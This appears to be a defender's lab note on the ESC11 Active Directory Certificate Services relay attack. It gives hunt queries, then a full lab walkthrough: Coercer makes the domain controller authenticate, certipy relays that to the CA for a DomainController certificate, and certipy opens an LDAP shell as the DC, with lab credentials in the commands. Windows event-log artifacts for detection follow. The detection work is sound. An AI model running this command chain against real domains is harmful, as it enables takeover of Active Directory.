# ESC11
# Sources
[https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)

# Hunts
### Changing InterfaceFlags
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*\\Services\\CertSvc\\Configuration\\* AND winlog.event_data.ObjectValueName:"InterfaceFlags"
```

### 4624 DC from an unusual IP on ADCS
Данный хант нужно адаптировать под себя. Можно сделать аналогичные по запросу TGT с использованием сертификата для хостовых УЗ с привязкой к нормальным IP.
```sql
ADCS == "braavos.essos.local"
DC == "MEEREEN$"

winlog.computer_name:"braavos.essos.local" AND winlog.event_id:4624 AND winlog.event_data.TargetUserName:"MEEREEN$" AND NOT source.ip:"192.168.56.12"
```

### Certificate request/issuance RPC+Connect
```sql
winlog.event_id:(4886 OR 4887 OR 4888 OR 4889) AND 
winlog.event_data.DCOMorRPC:"RPC" AND 
winlog.event_data.AuthenticationLevel:"Connect"
```

# Commands

## Installing Coercer
```bash
──(kali㉿kali)-[~/reps]
└─$ git clone https://github.com/p0dalirius/Coercer.git            
Cloning into 'Coercer'...
remote: Enumerating objects: 1225, done.
remote: Counting objects: 100% (171/171), done.
remote: Compressing objects: 100% (83/83), done.
remote: Total 1225 (delta 116), reused 88 (delta 88), pack-reused 1054 (from 2)
Receiving objects: 100% (1225/1225), 11.44 MiB | 651.00 KiB/s, done.
Resolving deltas: 100% (793/793), done.

     
┌──(kali㉿kali)-[~/reps]
└─$ cd Coercer 


┌──(kali㉿kali)-[~/reps/Coercer]
└─$ python3 -m venv coercer-venv
                                                                                                                                                                    
┌──(kali㉿kali)-[~/reps/Coercer]
└─$ source coercer-venv/bin/activate
                                                                                                                                                                    
┌──(coercer-venv)─(kali㉿kali)-[~/reps/Coercer]
└─$ pip install -r requirements.txt 
Ignoring pydivert: markers 'sys_platform == "win32"' don't match your environment
Collecting argcomplete (from -r requirements.txt (line 1))
  Using cached argcomplete-3.6.2-py3-none-any.whl.metadata (16 kB)
Collecting impacket (from -r requirements.txt (line 2))
  Using cached impacket-0.12.0-py3-none-any.whl
Collecting xlsxwriter (from -r requirements.txt (line 3))
  Using cached xlsxwriter-3.2.5-py3-none-any.whl.metadata (2.7 kB)
Collecting jinja2 (from -r requirements.txt (line 4))
  Using cached jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting sectools (from -r requirements.txt (line 5))
  Downloading sectools-1.4.4-py3-none-any.whl.metadata (455 bytes)
Collecting netifaces (from -r requirements.txt (line 6))
  Downloading netifaces-0.11.0.tar.gz (30 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting psutil (from -r requirements.txt (line 7))
  Downloading psutil-7.0.0-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (22 kB)
Collecting pyasn1>=0.2.3 (from impacket->-r requirements.txt (line 2))
  Using cached pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)
Collecting pyasn1_modules (from impacket->-r requirements.txt (line 2))
  Using cached pyasn1_modules-0.4.2-py3-none-any.whl.metadata (3.5 kB)
Collecting pycryptodomex (from impacket->-r requirements.txt (line 2))
  Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL==24.0.0 (from impacket->-r requirements.txt (line 2))
  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)
Collecting six (from impacket->-r requirements.txt (line 2))
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket->-r requirements.txt (line 2))
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket->-r requirements.txt (line 2))
  Using cached ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
Collecting flask>=1.0 (from impacket->-r requirements.txt (line 2))
  Using cached flask-3.1.1-py3-none-any.whl.metadata (3.0 kB)
Collecting setuptools (from impacket->-r requirements.txt (line 2))
  Using cached setuptools-80.9.0-py3-none-any.whl.metadata (6.6 kB)
Collecting charset_normalizer (from impacket->-r requirements.txt (line 2))
  Using cached charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting cryptography<43,>=41.0.5 (from pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 2))
  Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.3 kB)
Collecting cffi>=1.12 (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 2))
  Using cached cffi-1.17.1-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)
Collecting MarkupSafe>=2.0 (from jinja2->-r requirements.txt (line 4))
  Using cached MarkupSafe-3.0.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting pycparser (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket->-r requirements.txt (line 2))
  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)
Collecting blinker>=1.9.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached click-8.2.1-py3-none-any.whl.metadata (2.5 kB)
Collecting itsdangerous>=2.2.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting werkzeug>=3.1.0 (from flask>=1.0->impacket->-r requirements.txt (line 2))
  Using cached werkzeug-3.1.3-py3-none-any.whl.metadata (3.7 kB)
Collecting dnspython (from ldapdomaindump>=0.9.0->impacket->-r requirements.txt (line 2))
  Using cached dnspython-2.7.0-py3-none-any.whl.metadata (5.8 kB)
Using cached argcomplete-3.6.2-py3-none-any.whl (43 kB)
Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)
Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl (3.9 MB)
Using cached xlsxwriter-3.2.5-py3-none-any.whl (172 kB)
Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)
Downloading sectools-1.4.4-py3-none-any.whl (23 kB)
Downloading psutil-7.0.0-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (277 kB)
Using cached cffi-1.17.1-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)
Using cached flask-3.1.1-py3-none-any.whl (103 kB)
Using cached blinker-1.9.0-py3-none-any.whl (8.5 kB)
Using cached click-8.2.1-py3-none-any.whl (102 kB)
Using cached itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Using cached ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Using cached ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
Using cached MarkupSafe-3.0.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Using cached pyasn1-0.6.1-py3-none-any.whl (83 kB)
Using cached werkzeug-3.1.3-py3-none-any.whl (224 kB)
Using cached charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (148 kB)
Using cached dnspython-2.7.0-py3-none-any.whl (313 kB)
Using cached pyasn1_modules-0.4.2-py3-none-any.whl (181 kB)
Using cached pycparser-2.22-py3-none-any.whl (117 kB)
Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Using cached setuptools-80.9.0-py3-none-any.whl (1.2 MB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Building wheels for collected packages: netifaces
  Building wheel for netifaces (pyproject.toml) ... done
  Created wheel for netifaces: filename=netifaces-0.11.0-cp313-cp313-linux_x86_64.whl size=35082 sha256=86ab77d4537de743fd89e9f6a648b8128bee650a2f66c41b140cf10e75799f1a
  Stored in directory: /home/kali/.cache/pip/wheels/b6/30/e2/f47e3db48aecfc634b24146b62f520b4419b0bd90ef9ed1760
Successfully built netifaces
Installing collected packages: netifaces, xlsxwriter, six, setuptools, pycryptodomex, pycparser, pyasn1, psutil, MarkupSafe, itsdangerous, dnspython, click, charset_normalizer, blinker, argcomplete, werkzeug, pyasn1_modules, ldap3, jinja2, cffi, sectools, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket
Successfully installed MarkupSafe-3.0.2 argcomplete-3.6.2 blinker-1.9.0 cffi-1.17.1 charset_normalizer-3.4.2 click-8.2.1 cryptography-42.0.8 dnspython-2.7.0 flask-3.1.1 impacket-0.12.0 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 netifaces-0.11.0 psutil-7.0.0 pyOpenSSL-24.0.0 pyasn1-0.6.1 pyasn1_modules-0.4.2 pycparser-2.22 pycryptodomex-3.23.0 sectools-1.4.4 setuptools-80.9.0 six-1.17.0 werkzeug-3.1.3 xlsxwriter-3.2.5
```

## Short version

```bash
source coercer-venv/bin/activate

python Coercer.py  coerce -u 'daenerys.targaryen' -p 'BurnThemAll!' -t 192.168.56.12 --listener-ip 192.168.9.167
```

```bash
source certipy-venv/bin/activate

certipy relay -target rpc://braavos.essos.local -ca 'ESSOS-CA' -template DomainController
certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 -ldap-shell
whoami
```

## Detailed version
You first need to start the listener from step 1, and then, without stopping it, run Coercer from step 2 in another window.
### 1. Enable listener

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy relay -target rpc://braavos.essos.local -ca 'ESSOS-CA' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

/home/kali/certipy-venv/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] Targeting rpc://braavos.essos.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.9.188, attacking target rpc://braavos.essos.local
[*] Connecting to ncacn_ip_tcp:braavos.essos.local[135] to determine ICPR stringbinding
[*] Authenticating against rpc://braavos.essos.local as ESSOS/MEEREEN$ SUCCEED
[*] Attacking user 'MEEREEN$@ESSOS'
[*] Requesting certificate for user 'MEEREEN$' with template 'DomainController'
[*] Requesting certificate via RPC
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.9.188, attacking target rpc://braavos.essos.local
[*] Connecting to ncacn_ip_tcp:braavos.essos.local[135] to determine ICPR stringbinding
[*] Authenticating against rpc://braavos.essos.local as ESSOS/MEEREEN$ SUCCEED
[*] Request ID is 32
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'meereen.essos.local'
[*] Certificate object SID is 'S-1-5-21-666199682-1411342147-2938717855-1001'
[*] Saving certificate and private key to 'meereen.pfx'
File 'meereen.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'meereen.pfx'
[*] Exiting...
                                                                                                                                                                                                          
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'meereen.essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1001'
[*] Using principal: 'meereen$@essos.local'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
                                                                                                                                                                                                          
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'meereen.essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1001'
[*] Connecting to 'ldaps://192.168.56.12:636'
[*] Authenticated to '192.168.56.12' as: 'u:ESSOS\\MEEREEN$'
Type help for list of commands

# whoami
u:ESSOS\MEEREEN$

```


### 2. Coercer

```bash
┌──(coercer-venv)─(kali㉿kali)-[~/reps/Coercer]
└─$ python Coercer.py  coerce -u 'daenerys.targaryen' -p 'BurnThemAll!' -t 192.168.56.12 --listener-ip 192.168.9.167
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by Remi GASCOU (Podalirius)

[info] Starting coerce mode
[info] Scanning target 192.168.56.12
[info] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49669,49679,49681,49684,49751,49694
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\192.168.9.167\kvAFvNeV\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\192.168.9.167\B0pE8tR4\\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\192.168.9.167\ZPUgl0o4\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\192.168.9.167@80/WUP\share\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\192.168.9.167\5ufoQUXX\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\192.168.9.167\M0vgjKz1\\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\192.168.9.167\23epk7nK\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\192.168.9.167@80/9d8\share\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\192.168.9.167\BCLWYIAc\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? 

```


### 3. Authentication


```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'meereen.essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1001'
[*] Using principal: 'meereen$@essos.local'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
                                                                                                                                                                                                          
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'meereen.essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1001'
[*] Connecting to 'ldaps://192.168.56.12:636'
[*] Authenticated to '192.168.56.12' as: 'u:ESSOS\\MEEREEN$'
Type help for list of commands

# whoami
u:ESSOS\MEEREEN$
```

# Artifacts

### 4657 A registry value was modified
Script for parsing the mask `get_adcs_interfaceflags.rb`
```
Change Information:
  Old Value Type:   REG_DWORD
  Old Value:    1601 ["IF_LOCKICERTREQUEST", "IF_NOREMOTEICERTADMINBACKUP", "IF_ENFORCEENCRYPTICERTREQUEST", "IF_ENFORCEENCRYPTICERTADMIN"]
  New Value Type:   REG_DWORD
  New Value:    1089 ["IF_LOCKICERTREQUEST", "IF_NOREMOTEICERTADMINBACKUP", "IF_ENFORCEENCRYPTICERTADMIN"]

```

```
A registry value was modified.

Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0x92534

Object:
	Object Name:		\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\CertSvc\Configuration\ESSOS-CA
	Object Value Name:	InterfaceFlags
	Handle ID:		0x2bc
	Operation Type:		Existing registry value modified

Process Information:
	Process ID:		0x1300
	Process Name:		C:\Windows\System32\certutil.exe

Change Information:
	Old Value Type:		REG_DWORD
	Old Value:		1601
	New Value Type:		REG_DWORD
	New Value:		1089
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4657</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12801</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-29T16:52:11.9820055Z" /> 
  <EventRecordID>32790</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="4" ThreadID="2956" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x92534</Data> 
  <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\CertSvc\Configuration\ESSOS-CA</Data> 
  <Data Name="ObjectValueName">InterfaceFlags</Data> 
  <Data Name="HandleId">0x2bc</Data> 
  <Data Name="OperationType">%%1905</Data> 
  <Data Name="OldValueType">%%1876</Data> 
  <Data Name="OldValue">1601</Data> 
  <Data Name="NewValueType">%%1876</Data> 
  <Data Name="NewValue">1089</Data> 
  <Data Name="ProcessId">0x1300</Data> 
  <Data Name="ProcessName">C:\Windows\System32\certutil.exe</Data> 
  </EventData>
  </Event>
```

### 4624 Relay to the braavos.essos.local (ADCS)

```
An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\MEEREEN$
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0x2618AAA
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	MEEREEN
	Source Network Address:	192.168.56.101
	Source Port:		58681

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V1
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T19:24:00.2069666Z" /> 
  <EventRecordID>33587</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-0-0</Data> 
  <Data Name="SubjectUserName">-</Data> 
  <Data Name="SubjectDomainName">-</Data> 
  <Data Name="SubjectLogonId">0x0</Data> 
  <Data Name="TargetUserSid">S-1-5-21-666199682-1411342147-2938717855-1001</Data> 
  <Data Name="TargetUserName">MEEREEN$</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0x2618aaa</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">NtLmSsp</Data> 
  <Data Name="AuthenticationPackageName">NTLM</Data> 
  <Data Name="WorkstationName">MEEREEN</Data> 
  <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">NTLM V1</Data> 
  <Data Name="KeyLength">128</Data> 
  <Data Name="ProcessId">0x0</Data> 
  <Data Name="ProcessName">-</Data> 
  <Data Name="IpAddress">192.168.56.101</Data> 
  <Data Name="IpPort">58681</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

### 4886 Certificate Request by CN=Meereen$ (DC)

```
Certificate Services received a certificate request.
	
Request ID:	33
Requester:	ESSOS\MEEREEN$
Attributes:	CertificateTemplate:DomainController
Subject from CSR:	CN=Meereen$
Subject Alternative Name from CSR:

Requested Template:	DomainController
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Connect
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T19:24:00.3297537Z" /> 
  <EventRecordID>33589</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">33</Data> 
  <Data Name="Requester">ESSOS\MEEREEN$</Data> 
  <Data Name="Attributes">CertificateTemplate:DomainController</Data> 
  <Data Name="Subject">CN=Meereen$</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">DomainController</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Connect</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### 4887 Issued Certificate for CN=Meereen$ (DC)

```
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	33
Requester:	ESSOS\MEEREEN$
Attributes:	CertificateTemplate:DomainController
Disposition:	3
SKI:		b2 d5 e7 ef 46 72 bc b5 da b7 a5 7c bb 83 58 1c a1 63 36 0c
Subject:	CN=meereen.essos.local
Subject Alternative Name:
Other Name:
     DS Object Guid=04 10 59 6c d1 59 fe 7f 2e 42 be 90 60 fa ad 4a 61 94
DNS Name=meereen.essos.local

Certificate Template:	DomainController
Serial Number:		200000002123705e657e1e26d7000000000021
Authentication Service:	NTLM
Authentication Level:	Connect
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T19:24:00.4287080Z" /> 
  <EventRecordID>33593</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">33</Data> 
  <Data Name="Requester">ESSOS\MEEREEN$</Data> 
  <Data Name="Attributes">CertificateTemplate:DomainController</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">b2 d5 e7 ef 46 72 bc b5 da b7 a5 7c bb 83 58 1c a1 63 36 0c</Data> 
  <Data Name="Subject">CN=meereen.essos.local</Data> 
  <Data Name="SubjectAlternativeName">Other Name: DS Object Guid=04 10 59 6c d1 59 fe 7f 2e 42 be 90 60 fa ad 4a 61 94 DNS Name=meereen.essos.local</Data> 
  <Data Name="CertificateTemplate">DomainController</Data> 
  <Data Name="SerialNumber">200000002123705e657e1e26d7000000000021</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Connect</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```


### 4624 Successfull login by DC using Schannel+Microsoft Unified Security Protocol Provider

```
An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\MEEREEN$
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0x19C7276
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.56.101
	Source Port:		60195

Detailed Authentication Information:
	Logon Process:		Schannel
	Authentication Package:	Microsoft Unified Security Protocol Provider
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T20:11:20.381680200Z" /> 
  <EventRecordID>69581</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="580" ThreadID="5100" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-0-0</Data> 
  <Data Name="SubjectUserName">-</Data> 
